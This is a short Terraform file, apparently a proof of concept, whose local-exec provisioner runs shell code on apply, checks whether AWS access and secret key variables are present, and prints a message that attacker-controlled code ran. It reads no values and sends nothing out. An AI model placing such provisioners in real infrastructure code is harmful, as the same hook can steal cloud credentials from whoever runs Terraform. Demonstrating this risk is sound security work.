resource "null_resource" "proof_of_secret_access" {
  provisioner "local-exec" {
    command = <<EOT
echo "=== ATTACK SIMULATION ==="

if [ -n "$AWS_ACCESS_KEY_ID" ]; then
  echo "AWS_ACCESS_KEY_ID is set -> YES"
else
  echo "AWS_ACCESS_KEY_ID is set -> NO"
fi

if [ -n "$AWS_SECRET_ACCESS_KEY" ]; then
  echo "AWS_SECRET_ACCESS_KEY is set -> YES"
else
  echo "AWS_SECRET_ACCESS_KEY is set -> NO"
fi

echo "Terraform executed attacker-controlled code"
echo "========================="
EOT
  }
}

